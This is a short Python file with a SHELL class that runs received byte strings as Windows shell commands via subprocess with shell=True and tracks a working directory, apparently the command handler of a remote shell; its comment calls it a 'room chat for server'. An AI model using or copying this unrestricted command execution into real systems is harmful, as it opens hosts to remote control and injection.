import subprocess

class SHELL:
    # room chat for server

    def __init__(self):
        self.path = 'C:\\'

    def command(self, command):
        try:
            output = subprocess.check_output(command.decode('utf-8'), shell=True, cwd=self.path)
            if output == '':
                output = b'success'
        except:
            output = b'faild'
        return output

    def cd(self, line):
        if line in subprocess.check_output('dir', shell=True, cwd=self.path):
            self.path += '\\' + line.decode('utf-8')
